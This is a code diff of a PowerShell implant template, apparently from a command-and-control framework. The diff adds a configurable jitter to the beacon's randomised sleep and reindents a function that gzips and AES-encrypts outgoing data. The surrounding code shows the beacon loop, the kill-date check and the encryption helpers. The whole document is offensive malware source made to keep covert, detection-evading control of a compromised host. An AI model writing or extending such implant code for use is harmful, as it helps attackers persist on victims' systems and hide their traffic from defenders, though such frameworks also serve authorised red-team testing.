@@ -1,4 +1,5 @@
 $key="%s"
+$jitter=%s
 Function Beacon($sleeptime) {
     if ($sleeptime.ToLower().Contains('m')) { 
         $sleeptime = $sleeptime -replace 'm', ''
@@ -119,17 +120,17 @@ function Encrypt-String($key, $unencryptedString) {
     [System.Convert]::ToBase64String($fullData)
 }
 function Encrypt-Bytes($key, $bytes) {
-  [System.IO.MemoryStream] $output = New-Object System.IO.MemoryStream
-  $gzipStream = New-Object System.IO.Compression.GzipStream $output, ([IO.Compression.CompressionMode]::Compress)
-  $gzipStream.Write( $bytes, 0, $bytes.Length )
-  $gzipStream.Close()
-  $bytes = $output.ToArray()
-  $output.Close()
-  $aesManaged = Create-AesManagedObject $key
-  $encryptor = $aesManaged.CreateEncryptor()
-  $encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length)
-  [byte[]] $fullData = $aesManaged.IV + $encryptedData
-  $fullData
+    [System.IO.MemoryStream] $output = New-Object System.IO.MemoryStream
+    $gzipStream = New-Object System.IO.Compression.GzipStream $output, ([IO.Compression.CompressionMode]::Compress)
+    $gzipStream.Write( $bytes, 0, $bytes.Length )
+    $gzipStream.Close()
+    $bytes = $output.ToArray()
+    $output.Close()
+    $aesManaged = Create-AesManagedObject $key
+    $encryptor = $aesManaged.CreateEncryptor()
+    $encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length)
+    [byte[]] $fullData = $aesManaged.IV + $encryptedData
+    $fullData
 }
 function Decrypt-String($key, $encryptedStringWithIV) {
     $bytes = [System.Convert]::FromBase64String($encryptedStringWithIV)
@@ -188,7 +189,7 @@ while($true)
     $date = [datetime]::ParseExact($date,"dd/MM/yyyy",$null)
     $killdate = [datetime]::ParseExact("%s","dd/MM/yyyy",$null)
     if ($killdate -lt $date) {exit}
-    $sleeptimeran = $sleeptime, ($sleeptime * 1.1), ($sleeptime * 0.9)
+    $sleeptimeran = $sleeptime, ($sleeptime * (1 + $Jitter)), ($sleeptime * (1 - $Jitter))
     $newsleep = $sleeptimeran|get-random
     if ($newsleep -lt 1) {$newsleep = 5}
     start-sleep $newsleep
